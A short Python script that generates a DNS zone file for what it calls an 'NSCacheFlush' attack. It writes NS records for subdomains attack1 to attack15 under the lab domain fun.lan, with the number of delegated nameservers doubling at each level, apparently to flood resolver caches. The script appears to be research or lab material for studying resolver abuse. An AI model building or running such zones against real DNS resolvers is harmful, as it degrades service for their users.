with open('NSCacheFlush_zone_file.txt', 'w') as f:
    DOMAINS_NUM = 16

    for i in range(1, DOMAINS_NUM):
        for j in range(2**i):
            print(f'attack{i}	3600	IN	NS	auth{j}.fun.lan.', file=f)
